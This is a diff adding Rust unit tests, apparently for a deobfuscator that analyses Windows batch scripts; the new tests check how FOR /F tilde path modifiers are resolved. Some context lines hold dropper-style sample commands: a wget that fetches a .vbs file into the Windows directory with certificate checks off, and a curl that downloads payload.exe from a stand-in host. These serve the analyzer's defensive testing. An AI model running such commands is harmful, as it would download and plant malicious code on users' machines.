@@ -5630,6 +5630,61 @@ wget --no-check-certificate %urlgit%/win/get.vbs -O %windir%\get.vbs
     }
 
     #[test]
+    fn for_f_substitutes_tilde_name_modifier() {
+        let script =
+            br#"for /F "delims=" %%A in ("driver.inf") do if "%%~nA" NEQ "%%~A" echo stem=%%~nA full=%%~A"#;
+        let report = analyze(script, &Config::default());
+        assert!(
+            report
+                .deobfuscated
+                .contains("echo stem=driver full=driver.inf"),
+            "got:\n{}",
+            report.deobfuscated
+        );
+        assert!(
+            !report
+                .traits
+                .iter()
+                .any(|t| matches!(t, crate::traits::Trait::IfNotResolved { .. })),
+            "modifier-backed IF should resolve: {:?}",
+            report.traits
+        );
+    }
+
+    #[test]
+    fn for_f_substitutes_common_tilde_path_modifiers() {
+        let script = br#"for /F "delims=" %%A in ("C:\Temp\driver.inf") do echo d=%%~dA p=%%~pA dp=%%~dpA n=%%~nA x=%%~xA nx=%%~nxA short=%%~sA full=%%~A"#;
+        let report = analyze(script, &Config::default());
+        assert!(
+            report.deobfuscated.contains(
+                r#"echo d=C: p=\Temp\ dp=C:\Temp\ n=driver x=.inf nx=driver.inf short=C:\Temp\driver.inf full=C:\Temp\driver.inf"#
+            ),
+            "got:\n{}",
+            report.deobfuscated
+        );
+    }
+
+    #[test]
+    fn for_f_usebackq_dynamic_double_quoted_source_preserves_fallback() {
+        let script =
+            br#"for /F "usebackq tokens=1,* delims==" %%A in ("%%~i") do echo key=%%A value=%%B"#;
+        let report = analyze(script, &Config::default());
+        assert!(
+            report.deobfuscated.contains("echo key=%%~i value=%%B"),
+            "got:\n{}",
+            report.deobfuscated
+        );
+        assert!(
+            !report
+                .traits
+                .iter()
+                .any(|t| matches!(t, crate::traits::Trait::ForUnresolvedSource { .. })),
+            "dynamic usebackq source should preserve fallback without adding unresolved trait: {:?}",
+            report.traits
+        );
+    }
+
+    #[test]
     fn compact_for_f_reads_generated_file_source() {
         let script = br#"echo https://compact-for-f.example/payload.exe>url.txt
 for/f "tokens=* delims=" %%U in (url.txt) do curl -o payload.exe %%U"#;
